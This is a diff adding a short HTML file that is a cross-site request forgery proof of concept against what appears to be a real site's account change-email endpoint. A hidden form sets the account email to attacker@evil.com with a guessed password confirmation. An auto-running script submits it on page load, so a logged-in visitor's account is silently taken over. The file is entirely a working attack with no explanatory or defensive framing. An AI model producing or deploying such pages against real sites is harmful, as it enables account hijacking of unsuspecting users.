@@ -1,0 +1,13 @@
+<!-- csrf.html -->
+<html>
+  <body>
+    <form action="https://www.bosta.com/en-gb/b2baccount/changeEmail" method="POST">
+      <input type="hidden" name="newEmail" value="attacker@evil.com">
+      <input type="hidden" name="confirmNewEmail" value="attacker@evil.com">
+      <input type="hidden" name="passwordConfirmation" value="12345678">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
